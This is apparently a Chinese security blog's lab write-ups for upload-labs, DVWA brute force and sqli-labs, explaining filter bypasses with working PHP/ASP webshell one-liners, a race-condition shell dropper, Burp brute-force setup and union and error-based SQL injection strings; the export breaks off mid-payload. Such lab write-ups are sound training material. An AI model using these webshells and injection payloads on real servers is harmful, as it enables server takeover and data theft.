&#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125; 新函数： —）getimagesize() 功能：用于获取图像大小及相关信息，成功返回一个数组（成员为索引0、1、2、3等等），失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。 索引 0 给出的是图像宽度的像素值 索引 1 给出的是图像高度的像素值 索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM 索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 &lt;image标签 菜鸟教程实例： 那么这关也是直接上传图片马即可绕过。 pass-16：突破exif_imagetype() exif_imagetype()函数： 功能：读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。这个签名（也可以称为值）和 getimagesize() 返回的数组中的索引 2 的值是一样的，但本函数快得多。 那么这关也是直接上传图片马即可绕过。 pass-17：二次渲染绕过pass-18：条件竞争——时间型 代码审计：服务器先上传了图片，再判断后缀是否符合，符合则重命名，不符合则删除。 那么我们可以发现在我们上传了不符合的图片服务器保存到其删除肯定会有时间差的，那么我们就可以利用这一时间差进行我们的操作：上传新的一句话木马： &lt; ?php fputs(fopen(‘shell.php’,’w’),’&lt; ?php @eval($_POST[“pass”])?&gt;’);?&gt; 新函数： —）fputs() 函数——别名fwrite 功能：写入文件（可安全用于二进制文件） 语法：fputs(file,string,length) 参数 描述 file 必需。规定要写入的打开文件。 string 必需。规定要写入文件的字符串。 length 可选。规定要写入的最大字节数。 —）fopen()函数 功能：打开文件或者 URL。 语法：fopen(filename,mode,include_path,context) 参数 描述 filename 必需。规定要打开的文件或 URL。 mode 必需。规定要求到该文件/流的访问类型。可能的值见下表。 include_path 可选。如果也需要在 include_path 中检索文件的话，可以将该参数设为 1 或 TRUE。 context 可选。规定文件句柄的环境。Context 是可以修改流的行为的一套选项。 其中mode可选的类型有： mode 说明 “r” 只读方式打开，将文件指针指向文件头。 “r+” 读写方式打开，将文件指针指向文件头。 “w” 写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。 “w+” 读写方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。 “a” 写入方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之。 “a+” 读写方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之。 “x” 创建并以写入方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回 FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建之。这和给底层的 open(2) 系统调用指定 O_EXCL|O_CREAT 标记是等价的。此选项被 PHP 4.3.2 以及以后的版本所支持，仅能用于本地文件。 “x+” 创建并以读写方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回 FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建之。这和给底层的 open(2) 系统调用指定 O_EXCL|O_CREAT 标记是等价的。此选项被 PHP 4.3.2 以及以后的版本所支持，仅能用于本地文件。 把这个php文件通过burp一直不停的上传，总会有那么一瞬间是还没来得及删除就可以被访问到的（可以通过增加burpsuite线程来提高几率），一旦访问到该文件就会在当前目录下生成一个webshell2.0.php的一句话，然后用蚁剑连接shell.php即可。 pass-19：条件竞争pass-20 代码审计： 1234567891011121314151617181920212223242526 $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#x27;save_name&#x27;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125;else&#123; $msg = &#x27;禁止保存为该类型文件！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 新函数： —）pathinfo()函数 功能：以数组的形式返回文件路径的信息 语法：pathinfo(path,process_sections) 参数 描述 path 必需。规定要检查的路径。 process_sections 可选。规定要返回的数组元素。默认是 all。可能的值：PATHINFO_DIRNAME - 只返回 dirname（目录路径）PATHINFO_BASENAME - 只返回 basename（文件名）PATHINFO_EXTENSION - 只返回 extension（文件名后缀） 感觉这关就是前面的黑名单绕过，打组合拳就好了。 pass-21 代码审计： 123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123; //检查MIME $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;); if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123; $msg = &quot;禁止上传该类型文件!&quot;; &#125;else&#123; //检查文件名 $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;]; if (!is_array($file)) &#123; $file = explode(&#x27;.&#x27;, strtolower($file)); &#125; $ext = end($file); $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;禁止上传该后缀文件!&quot;; &#125;else&#123; $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &quot;文件上传成功！&quot;; $is_upload = true; &#125; else &#123; $msg = &quot;文件上传失败！&quot;; &#125; &#125; &#125;&#125;else&#123; $msg = &quot;请选择要上传的文件！&quot;;&#125; 新函数： —）empty()函数 功能：用于检查一个变量是否为空。 —）explode()函数 功能：把字符串打散为数组。 语法：explode(separator,string,limit) 参数 描述 separator 必需。规定在哪里分割字符串。 string 必需。要分割的字符串。 limit 可选。规定所返回的数组元素的数目。可能的值：大于 0 - 返回包含最多 limit 个元素的数组；小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组；0 - 返回包含一个元素的数组 —）is_array() 函数 功能：用于检测变量是否是一个数组。 —）end()函数 功能：将数组内部指针指向最后一个元素，并返回该元素的值（如果成功）。 语法：end(array) 参数 描述 array 必需。规定要使用的数组。 相关的函数： current() - 返回数组中的当前元素的值 next() - 将内部指针指向数组中的下一个元素，并输出 prev() - 将内部指针指向数组中的上一个元素，并输出 reset()- 将内部指针指向数组中的第一个元素，并输出 each() - 返回当前元素的键名和键值，并将内部指针向前移动 我们可以看到服务器先对上传的图片进行了MIME检查，然后判断save_name参数是否为空，为空就把文件本来名称赋值给$file,否则就是将save_name参数的值赋给$file。接着判断$file是否是数组，如果不是数组则拆除数组，将数组的最后一个元素（也就是后缀）和允许上传文件后缀相比，若符合则取$file数组的第一个元素加.和$file的第二个元素作为新的文件名，并将图片文件上传到指定路径。 补充知识：对于像.php/.这样的文件路径，move_uploaded_file()函数会忽略掉文件末尾的/.。如此一来我们上传到服务器的文件还是被重命名为了php后缀。 那么这关我们的想法是：提前将save_name设置为数组，即令save_name[0]=webshell.php/、save_name[2]=jpg，其中save_name[1]的值为空。这样就可令$file_name=webshell.php/.。但是这边有个疑问，save_name数组的元素个数不是三个吗，$file[count($file) - 1]=$file[2]啊。但是其实我们只对数组赋值了两个元素，因此count的值为2，这就相当于你有3个口袋，但是只有两个口袋有钱。 下面是实践：","tags":[{"name":"upload-labs","slug":"upload-labs","permalink":"http://example.com/tags/upload-labs/"}]},{"title":"DVWA—Brute Force","date":"2021-02-16T13:36:40.000Z","path":"2021/02/16/DVWA—Brute Force/","text":"前言该系列的实验主要围绕利用burpsuite的暴力破解。暴力破解，是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一。 Low查看源码： 1234$user = $_GET[ &#x27;username&#x27; ]; $pass = $_GET[ &#x27;password&#x27; ]; $pass = md5( $pass ); $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; 我们可以看到服务器对输入的账号密码没有做任何过滤处理，那么我们有两种方法： 1)SQL注入 输入username：admin’#，password：随便输。 2)暴力破解 输入目标账号和随意密码，抓包： ![1](DVWA—Brute Force/1.png) send to intruder，清除标记，对希望爆破的值标记：![2](DVWA—Brute Force/2.png) 选择payload，载入字典：![3](DVWA—Brute Force/3.png) start attack，我们可以看到当payload的值为password时回文的长度与众不同，因此我们得知用户admin的密码为password![4](DVWA—Brute Force/4.png) Medium查看源码： 1234567if(isset($_GET[&#x27;Login&#x27;]))&#123; $user=$_GET[&#x27;username&#x27;]; $user=mysql_real_escape_string($user); $pass=$_GET[&#x27;password&#x27;]; $pass=mysql_real_escape_string($pass);$pass=md5($pass);$query=&quot;SELECT*FROM`users`WHEREuser=&#x27;$user&#x27;ANDpassword=&#x27;$pass&#x27;;&quot;; 我们看到服务器对账号密码都做了过滤处理，对一些敏感字符进行了转义。实战中如果目标服务器的MySQL数据库采用gbk编码，那么我们可以里用宽字节绕过，但是我这边数据库没有这么设置，因此我们用SQL注入是不大可能实现了，我们接着看源码发现绕过我们输入了错误的账号密码，服务器也只会延迟网页两秒而已，不算有效的防爆破机制。一次本关仍使用暴力破解，具体同上一关。 High查看源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 补充—— $GLOBALS ：引用全局作用域中可用的全部变量。$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。 通过代码审计我们可以看到，服务器使用了Anti-CSRF token来抵御CSRF的攻击，使用了stripslashes函数和mysqli_real_esacpe_string来抵御SQL注入和XSS的攻击。而且由于使用了Anti-CSRF token，每次服务器返回到登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。所以，我们不能再像low和medium级别一样，利用burpsuite进行无脑式的爆破了。 这关可以有两种解法，一种是利用paython脚本从html页面中抓取user_token的值（但是我还没学paython，等以后补吧），另一种是仍使用burp，因为即使我们输错密码， sleep( rand( 0, 3 ) )也只会网页延迟0到3秒，不足以防御暴力破解。但我们需要更换攻击模式等，我们下面展开来讲： 将攻击模式改为Pitchfork{草叉模式 ——它可以使用多组Payload集合，在每一个不同的Payload标志 位置上（最多20个），遍历所有的Payload。举例来说，如果有两个Payload标志位置， 第一个Payload值为A和B，第二个Payload值为a和b，则发起攻击时，将共发起两次攻 击，第一次使用的Payload分别为A和a，第二次使用的Payload分别为B和b。}并将password和user_token设为变量。![5](DVWA—Brute Force/5-1614780376113.png) 第一个变量password我们就照常载入字典就可以了。第二个变量user_token的payload设置我们选择Recursive grep 选项（Recursive grep——此Payload类型主要使用于从服务器端提取有效数据的场景，需要先从服务器的响应中提取数据作为Payload，然后替换Payload的位置，进行 攻击。它的数据来源了原始的响应消息，基于原始响应，在Payload的可选项设置 （Options）的 Grep-Extract中配置Grep规则，然后根据grep去提取数据才能发生攻击），然后我们在option 选项中找到 Grep-Extract ,点击 Add, 然后点击 Refetch repose 即可看到抓取到的源代码了，我们找到 user_token 的值value，选中它，之后点击ok。![6](DVWA—Brute Force/6.png) ![7](DVWA—Brute Force/7-1614781678680.png) 其实上述的操作只是为了达到一个目的：由于每次访问服务器后，user_token都会刷新，那么我们要让变量user_token”与时俱进“。 此外我们要将线程设为1，因为recursive grep payloads cannot be used with multiple request threads。同时 在 Options 中找到 Redirections 设置为 Always。做完这些准备操作，就可以点击start attack开始爆破， ![8](DVWA—Brute Force/8.png) 我们可以有两个值的回文长度异常，我们点击数据具体查看回文，发现密码为paaword时登入成功： ![9](DVWA—Brute Force/9.png)","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"upload-labs-pass1—13","date":"2021-02-09T11:32:20.000Z","path":"2021/02/09/upload-labs-pass1-13/","text":"[TOC] 前言upload-labs主要是一些针对文件上传漏洞的实验。 再正式开始之前，先了解一下什么是文件上传漏洞？ 文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。常见场景是web服务器允许用户上传图片或者普通文本文件保存，而用户绕过上传机制上传恶意代码并执行从而控制服务器。显然这种漏洞是getshell最快最直接的方法之一，需要说明的是上传文件操作本身是没有问题的，问题在于文件上传到服务器后，服务器怎么处理和解释文件。web应用程序通常带有文件上传的功能，比如在博客发表文章需要上传图片等行为就可能存在文件上传漏洞。文件上传漏洞就是利用网页代码中的文件上传路径变量过滤不严将，将可执行的文件上传到一个到服务器中，再通过URL去访问以执行恶意代码——攻击者可以直接上传WebShell（以asp、php或者jsp等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门）到服务器上。然后利用渗透工具（如蚁剑）连接webshell以达到操作服务器的目的。 上传漏洞类型大体可分为以下几类： 判断上传漏洞类型的思路： webshell（一句话木马）的制备 1模板： &lt;?php @eval($_POST[&#x27;password&#x27;]);?&gt; @表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST[&#39;password&#39;]表示从页面中用post的方式获得password这个参数值。 那么这句话的作用是什么呢？举个例子：password=echo ‘a’，就相当于&lt; ?php @eval(“echo ‘a’”);? &gt;即再网页上输出一个a。我们知道了这个就可以根据改变password的值来达到操控服务器的目的了，或者我们可以连接蚁剑，一键获取目标服务器。 补充： 入侵的条件 （1）木马上传成功，未被杀；（2）知道木马的路径在哪；（3）上传的木马能正常运行。 常见的一句话木马 php的一句话木马： &lt; ?php @eval($_POST[‘pass’]);? &gt;asp的一句话是： &lt;%eval request (“pass”)%&gt;aspx的一句话是： &lt;%@ Page Language=”Jscript”%&gt; &lt;%eval(Request.Item[“pass”],”unsafe”);%&gt; pass-01：js检查打开pass-01的index.php查看源码，我们看到网页对上传的图片做了js检查， 而且设置了上传白名单， 因此题目要求我们上传一个webshell到服务器上，我们可以有以下三种思路： 删除那段有关js检查的代码 增加白名单中可上传文件类型 先将上传文件类型改为白名单的一种（使其通过js检查）然后用burp抓包，再将其文件后缀更改为预期文件类型 pass-02：MIME绕过 查看提示：本pass在服务端对数据包的MIME进行检查。 MIME：MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。在HTTP中，MIME类型被定义在Content-Type header中。 常见的MIME类型： udio/mpeg -&gt; .mp3application/msword -&gt; .docapplication/octet-stream -&gt; .exeapplication/pdf -&gt; .pdfapplication/x-javascript -&gt; .jsapplication/x-rar -&gt; .rarapplication/zip -&gt; .zipimage/gif -&gt; .gifimage/jpeg -&gt; .jpg / .jpegimage/png -&gt; .pngtext/plain -&gt; .txttext/html -&gt; .htmlvideo/mp4 -&gt; .mp4 查看源码： 也就是说服务器还是规定了白名单，那么我们可以有以下两种思路： 1.先将webshell后缀类型改为允许上传的文件后缀类型（使其绕过MIME检查），然后burp抓包，将webshell后缀改回.php。 2.将webshell.php文件上传，burp抓包，将Content-Type的MIME类型改为白名单中的类型。 sp：我在看源码的时候发现这关的源码也存在js检查的源码，但是我发现把这段码删了并不能实现上传webshell，因为源码中没有规定checkfile()的作用，而且服务器是通过if语句判断上传文件类型是否符合。 pass-03：上传特殊可解析后缀 查看源码： 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 我们可以看到服务器对上传文件做了很多过滤处理，包括设定了黑名单。 这边我们补充一个知识点：Apache解析顺序是从右到左开始解析文件后缀，如果最右侧扩展名不能识别的话，就继续往左判断，直到遇到可以解析的文件后缀为止。而且Apache的httpd.conf中可以进行配置（AddType application/x-httpd-php .php .php3 .phtml），规定哪些文件后缀是以php格式来解析的。 ​ 我们看到黑名单中没有禁用这些可解析后缀，因此我们可以利用这一点，上传可解析后缀。 sp：常用可解析后缀 陌生函数： ！strrchr() 函数 功能：查找字符，在指定字符串中从后面开始的第一次出现的位置，如果成功，则返回从该位置到字符串结尾的所有字符，如果失败，则返回 false。 语法：strrchr(string，char) 参数 描述 string 必需。规定被搜索的字符串。 char 必需。规定要查找的字符。如果该参数是数字，则搜索匹配数字 ASCII 值的字符。 ！trim()函数 功能：除去字符串开头和末尾的空格或其他字符。 语法：trim (string $str [,string $charlist ]) 参数 描述 string 必需。规定要检查的字符串。 charlist 可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：”\\0” - NULL ；”\\t” - 制表符； “\\n” - 换行； “\\x0B” - 垂直制表符； “\\r” - 回车 ；” “ - 空格 ！in_array()函数 功能：搜索数组中是否存在指定的值。 语法：in_array(search,array,type) 参数 描述 search 必需。规定要在数组搜索的值。 array 必需。规定要搜索的数组。 type 可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。如果 search 参数是字符串且 type 参数被设置为 TRUE，则搜索区分大小写。 ！move_uploaded_file() 函数 功能：将上传的文件移动到新位置。 语法：move_uploaded_file(file,newloc) 参数 描述 file 必需。规定要移动的文件。 newloc 必需。规定文件的新位置。 注：这关我没能实现在本地复现，上传shell后用蚁剑连接不上，好像是Apache的版本不能太高。 ！str_ireplace() 函数 功能：替换字符串中的一些字符（不区分大小写）。 语法：str_ireplace(find,replace,string,count) 参数 描述 find 必需。规定要查找的值。 replace 必需。规定替换 find 中的值的值。 string 必需。规定被搜索的字符串。 count 可选。一个变量，对替换数进行计数。 pass-04：上传.htaccess 这关的黑名单添加了可解析后缀，但是忽略了.htaccess类型。 htaccess文件是Apache服务器中的一个配置文件，负责相关目录下网页配置，可以帮我们实现网页301重定向，自定义404错误页面，改变文件扩展名等功能。其中.htaccess文件内容:SetHandler application/x-httpd-php设置当前目录所有文件都使用PHP解析，无论上传任何类型文件，只要文件内容符合php语言代码规范，就会被当做php文件执行。 因此这关的思路是：先上传一个后缀为.htaccess，内容为：SetHandler application/x-httpd-php ​ &lt;FilesMatch “webshell.jpg”&gt; 或 SetHandler application/x-httpd-php 的文件，然后再上传webshell.jpg即可。 ​ 注：这关我没能实现在本地复现，上传shell后用蚁剑连接不上，好像是Apache的版本不能太高。 pass-05 pass-04是利用Apache的解析文件进行绕过黑名单，这关则是利用PHP的解析方式绕过黑名单。 我们看到黑名单里又多加了一个htaccess类型，但是php配置文件类型php.ini没有被禁用，且提示告诉我们上传目录存在php文件（readme.php）。 那么这关的思路：先上传一个后缀为.user.ini（相当于用户自定义的php.ini）内容为 auto_prepend_file=webshell.png（意思是该目录下的所有php文件都包含webshell.png），然后我们再上传webshell.png，最后用蚁剑连接时我们要注意连接的是readme.php（因为其文件内容包含shell）而不是webshell.png。 但是这里我其实有个疑问：那就是我们在现实渗透的时候又怎么会知道靶机的上传目录是否存在.php类型文件，以及.php文件的文件名呢？挖个坑！！！！！！！！！！！！！！！！！！！！！！！！！！！ pass-06：后缀大小写绕过 这关我们查看源码发现，它的黑名单已经相当齐全了，但是它相对前几关删了一个函数：strtolower()。其作用就是把所有字符全部转为小写字母。 那么这关利用这一漏洞，上传webshell.phP文件，然后蚁剑连接即可。 pass-07：空格绕过 查看源码发现它删去了trim()函数。 这边补一个知识：在win系统下呢，如果文件后缀最后面是空格、点、：：$DATA会自动省去，也就是说在客户端目录下的是文件名是”干净”。那么我们这关的思路是：上传webshell.php文件然后抓包，在后缀后加一个空格。 那么这关的思路就是：先上传webshell.php，抓包，在后缀后加个空格 sp：没能复现 pass-08：点绕过 查看源码发现它删去了deldot()函数。原理同pass-07 那么这关的思路就是：上传webshell.php然后抓包，在后缀后加个点（.） pass-09：::$DATA绕过 查看源码发现少了对::$DATA的过滤。 DATA(NTFS文件系统的存储数据流的一个属性)NTFS文件系统包括对备用数据流的支持,备用数据流允许文件包含多个数据流，每个文件至少有一个数据流。在Windows中，这个默认数据流称为：$DATA,当我们访问1.php::$DATA 时，就是请求 1.php 本身的数据，如果a.php 还包含了其他的数据流，比如a.php:lake2.php，请求1.php:lake2.php::$DATA，则是请求1.php中的流数据lake2.php的流数据内容。 那么我们这关的思路是：先webshell.php，抓包，后缀后添加::DATA，最后蚁剑连接。 pass-10 这关查看源码发现过滤的都过滤了，但是和以往有一点不同：上传位置表达方式改变 旧：$img_path = UPLOAD_PATH.’/‘.date(“YmdHis”).rand(1000,9999).$file_ext; 新：$img_path = UPLOAD_PATH.’/‘.$file_name; sp：没能复现 pass-11：双后缀名绕过我们查看源码，发现关键句：$file_name = str_ireplace($deny_ext,””, $file_name);意思是查找上传的文件名中是否存在黑名单中的值，如果存在就删去。 那么这关我们的思路是：上传webshell.php，抓包，后缀更改为pphphp pass-12：%00截断（get型）查看这关的源码，发现上传位置表达方式改变了——$img_path = $_GET[‘save_path’].”/“.rand(10, 99).date(“YmdHis”).”.”.$file_ext; 我们可以发现save_pasth是可控路径，有点像sql注入里?id=。 先补充知识： 1.php语法中，当一个字符串中存在空字符时，会导致空字符后面的字符被丢弃（误把它当成结束符），后面的数据直接忽略，这就导致漏洞产生。 2.%00是对ascii码中的0对应的字符编码后的结果，0x00则是%00解码成的16进制。当url中的参数是通过GET方式获取时，%00会被自动解码。当通过POST方式获取时，不会自动解码，%00只会原样被当成字符串来输出。所以通过POST方式请求时，我们需要手动将它改写为十六进制0x00。 那么这关我们的思路就是：上传webshell.png，抓包，令save_pasth=../upload/webshell.php%00 sp：strrpos()函数 功能：strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。返回字符（字符串）在目标字符串中最后一次出现的位置，如果没有找到字符串则返回 FALSE。字符串位置从 0 开始，不是从 1 开始。 语法：strrpos(string,find,start) 参数 描述 string 必需。规定被搜索的字符串。 find 必需。规定要查找的字符。 start 可选。规定在何处开始搜索。 pass-13：0x00截断（post型）法一：同pass-12 法二：上传webshell.png，抓包 加上webshell.php，然后点开Hex，将webshell.php后面的20改为00，如果找不到20，那么就在raw的webshell.php后面加个空格","tags":[{"name":"upload-labs","slug":"upload-labs","permalink":"http://example.com/tags/upload-labs/"}]},{"title":"lesson54-65","date":"2021-02-08T15:57:12.000Z","path":"2021/02/08/lesson54-65/","text":"lesson54：我们通过查看蓝字可以大致明白这关的意思：输入payload的次数小等于十次的情况下获得数据库秘钥，如果超过十次那么表名，列名还有秘钥就会重新刷新。 试探注入类型：?id=1’，页面错误，但是没有回显错误信息 ?id=1’ and ‘1’=’1，登入成功，回显用户名和密码 ?id=1’ and ‘1’=’2，页面错误 因此我们可知存在sql注入点，且为单引号型。 因为我们知道了库名，我们就无需再爆库了。 爆表：?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’challenges’ –+ 爆列：?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’xfih974sor ‘–+ 爆值：?id=-1’ union select 1,2,group_concat(secret_2W57) from challenges.xfih974sor–+ 然后我们把得到的值输入，submit即可。 最后查看源码，发现PHP对输入的key做了过滤处理，也就是说我们想从key一栏进行注入还是比较困难的。 lesson55：同lesson54，不过注入类型改为了)。 lesson56：同lesson54，不过注入类型改为了&#39;)。 lesson57:同lesson54，不过注入类型改为了&quot;。 lesson58:执行 sql 语句后，并没有返回数据库当中的数据，所以我们这里不能使用 union 联合注入， 这里使用报错注入或者延时注入。 lesson59：同lesson58，注入类型变为数字型。 lesson60：同lesson58，注入类型变为&quot;)。 lesson61：同lesson58，注入类型变为&#39;)) lesson62:sql语法错误时不会回显报错，那么报错注入也没法用了，只能延时注入。 lesson63、64、65：同lesson62，仅改变注入类型。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson46-53","date":"2021-02-07T10:56:07.000Z","path":"2021/02/07/lesson46-53/","text":"background——Order by后的注入： 查看mysql官方select的文档： 由于order by 后面只能接(字段名，表达式，位置)等信息，我们并不能向原来一样使用联合查询。 查看lesson46的源码： 12345678$id=$_GET[&#x27;sort&#x27;]; if(isset($id)) &#123; //logging the connection parameters to a file for analysis. $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;); fwrite($fp,&#x27;SORT:&#x27;.$id.&quot;\\n&quot;); fclose($fp);$sql = &quot;SELECT * FROM users ORDER BY $id&quot;; 我们看到这关我们的输入应该是?sort=，而不再是?id=。我们输入?sort=1，即对第一列进行升序排序，且参数值要小等于列数，否则会报错（如有一个表有三列，?sort=4，页面就会报错）。 lesson46：我们查看源码可知这是数字型注入，那么我们怎么判断是否存在order by后的注入呢？我们可以通过对比输入?sort=1 desc和?sort=1 asc（desc降序，asc升序）的返回页面来判断是否存在order by后的注入——若两者返回值不同，则说明存在order by后的注入。 这关的payload句式有三种： ?sort=(select ······) ?sort=1 and (select ······) ?sort=rand(······) 注：句式(1)和(2)没有本质上的区别。 解法一.报错注入：爆库：?sort=1 and updatexml(1,concat(‘~’, database()),1) 爆表：?sort=1 and updatexml(1,concat(‘~’,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)),1) 爆列：?sort=1 and updatexml(1,concat(‘~’,(select group_concat(column_name) from information_schema.columns where 